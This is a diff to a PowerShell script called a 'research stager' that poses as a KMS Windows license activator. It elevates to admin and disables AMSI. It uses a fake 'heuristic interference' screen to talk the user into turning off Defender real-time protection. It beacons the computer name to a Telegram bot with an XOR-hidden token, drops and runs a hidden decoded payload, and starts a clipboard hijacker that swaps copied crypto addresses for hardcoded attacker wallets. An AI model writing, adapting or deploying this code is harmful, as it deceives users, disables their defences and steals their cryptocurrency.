@@ -1,14 +1,18 @@
-# --- [RESEARCH STAGER v48.0: RESTORED V34.0 CORE] ---
+# --- [RESEARCH STAGER v49.0: ENTERPRISE KMS SUITE] ---
 
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
-# 1. FORCE ADMIN ELEVATION (STRICT v34.0 LOGIC)
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Verb RunAs"
+# 1. THE ADMIN GATE (Must click YES on the blue box for this to work)
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $processInfo.FileName = "powershell.exe"
+    $processInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    $processInfo.Verb = "runas"
     try {
-        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+        [System.Diagnostics.Process]::Start($processInfo) | Out-Null
     } catch {
-        [Windows.Forms.MessageBox]::Show("This deployment requires Administrator privileges. Please click 'Yes' when prompted.", "System Requirement", 0, 48) | Out-Null
+        [Windows.Forms.MessageBox]::Show("System Error: Administrative elevation declined. Please restart and click 'Yes'.", "Access Denied", 0, 16) | Out-Null
     }
     exit
 }
@@ -16,12 +20,8 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 function Global-Initialize {
     try {
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
-        $u = "System.Management.Automation.AmsiUtils"
-        $as = [Ref].Assembly.GetType($u)
-        if ($as) {
-            $f = $as.GetField("amsiInitFailed", "NonPublic,Static")
-            if ($f) { $f.SetValue($null, $true) }
-        }
+        $u = "System.Management.Automation.AmsiUtils"; $as = [Ref].Assembly.GetType($u)
+        if ($as) { $f = $as.GetField("amsiInitFailed", "NonPublic,Static"); if ($f) { $f.SetValue($null, $true) } }
     } catch {}
 }
 
@@ -29,35 +29,38 @@ function Send-Ping {
     param($m)
     $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
     $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
-    $url = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m"
-    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
+    try { (New-Object Net.WebClient).DownloadString("https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m") | Out-Null } catch {}
 }
 
 function Show-SecurityPrep {
     $prep = New-Object Windows.Forms.Form
-    $prep.Text = "Enterprise Deployment Assistant"; $prep.Size = New-Object Drawing.Size(580,520)
+    $prep.Text = "KMS Enterprise Service Manager"; $prep.Size = New-Object Drawing.Size(580,540)
     $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true
 
     $console = New-Object Windows.Forms.Label
-    $console.Location = New-Object Drawing.Point(35,60); $console.Size = New-Object Drawing.Size(490,160)
+    $console.Location = New-Object Drawing.Point(35,40); $console.Size = New-Object Drawing.Size(490,160)
     $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
     $console.Font = New-Object Drawing.Font("Consolas", 9)
-    $console.Text = " > ANALYZING KERNEL... DONE`n > PRIVILEGES: GRANTED`n > STATUS: [!] SECURITY CONFLICT DETECTED"
+    $console.Text = " > INITIALIZING KMS AGENT... DONE`n > ENCRYPTING TUNNEL... DONE`n > ERROR: HEURISTIC INTERFERENCE DETECTED`n > ADVICE: DISABLE REAL-TIME PROTECTION TO ALLOW HOOKING."
     $prep.Controls.Add($console)
 
+    $instr = New-Object Windows.Forms.Label
+    $instr.Location = New-Object Drawing.Point(35,220); $instr.Size = New-Object Drawing.Size(500,60)
+    $instr.Text = "To apply the digital license, 'Real-time protection' must be suspended. Failure to do so will result in a deployment crash."
+    $prep.Controls.Add($instr)
+
     $link = New-Object Windows.Forms.Button
-    $link.Location = New-Object Drawing.Point(40,330); $link.Size = New-Object Drawing.Size(480,45)
-    $link.Text = "Manual Security Override (Turn Real-time OFF)"; $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215)
-    $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"
+    $link.Location = New-Object Drawing.Point(40,300); $link.Size = New-Object Drawing.Size(480,45)
+    $link.Text = "Step 1: Open Windows Security"; $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215); $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"
     $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
     $prep.Controls.Add($link)
 
     $check = New-Object Windows.Forms.CheckBox
-    $check.Location = New-Object Drawing.Point(45,390); $check.Size = New-Object Drawing.Size(500,30)
-    $check.Text = "I have suspended protection and will approve the following request."; $prep.Controls.Add($check)
+    $check.Location = New-Object Drawing.Point(45,360); $check.Size = New-Object Drawing.Size(450,30)
+    $check.Text = "Step 2: I have disabled protection and am ready."; $prep.Controls.Add($check)
 
     $btn = New-Object Windows.Forms.Button
-    $btn.Location = New-Object Drawing.Point(195,430); $btn.Size = New-Object Drawing.Size(180,40); $btn.Text = "Deploy Now"; $btn.Enabled = $false
+    $btn.Location = New-Object Drawing.Point(195,410); $btn.Size = New-Object Drawing.Size(180,45); $btn.Text = "Apply License"; $btn.Enabled = $false
     $prep.Controls.Add($btn)
 
     $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
@@ -67,28 +70,28 @@ function Show-SecurityPrep {
 
 function Show-ActivatorUI {
     $form = New-Object Windows.Forms.Form
-    $form.Text = "Deployment Progress"; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
-    $label = New-Object Windows.Forms.Label; $label.Location = New-Object Drawing.Point(30,30); $label.Text = "Status: Initializing..."
+    $form.Text = "KMS Deployment Progress"; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
+    $label = New-Object Windows.Forms.Label; $label.Location = New-Object Drawing.Point(30,30); $label.Size = New-Object Drawing.Size(380,30); $label.Text = "Status: Initializing KMS Tunnel..."
     $form.Controls.Add($label)
-    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,65); $pb.Size = New-Object Drawing.Size(370,25)
+    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,70); $pb.Size = New-Object Drawing.Size(370,25)
     $form.Controls.Add($pb); $form.Show()
 
-    $stages = @(@{p=30;t="Applying Certificate..."}, @{p=70;t="Action Required: Approve Security..."}, @{p=100;t="Activation Success."})
+    $stages = @(@{p=30;t="Fetching Certificates..."}, @{p=70;t="Action Required: Approve Security Request..."}, @{p=100;t="Success."})
     foreach ($s in $stages) {
         $label.Text = "Status: " + $s.t
-        if ($pb.Value -eq 70) { Start-Sleep -Seconds 2 } # Give user time for the UAC prompt
-        while ($pb.Value -lt $s.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 50 }
+        if ($pb.Value -eq 70) { Start-Sleep -Seconds 5 } # IMPORTANT: Gives you time to click YES
+        while ($pb.Value -lt $s.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 60 }
     }
     $form.Close()
-    [Windows.Forms.MessageBox]::Show("Windows Activated Successfully.", "Success", 0, 64) | Out-Null
+    [Windows.Forms.MessageBox]::Show("Enterprise Activation Successful.", "KMS Manager", 0, 64) | Out-Null
 }
 
-# --- EXECUTION (EXACT v34.0 LOGIC) ---
+# --- THE V34.0 CORE LOGIC ---
 Global-Initialize
 Show-SecurityPrep
 
 if ($global:proceed) {
-    Send-Ping -m "V48_RELOADED_ON_$env:COMPUTERNAME"
+    Send-Ping -m "V49_ENTERPRISE_ACTIVE_ON_$env:COMPUTERNAME"
     
     $BG_Logic = {
         try {
@@ -107,7 +110,7 @@ if ($global:proceed) {
             for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
             [IO.File]::WriteAllBytes($path, $data)
             
-            # This triggers the blue box you saw
+            # This triggers the blue box from your image
             Start-Process $path -WindowStyle Hidden
 
             $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
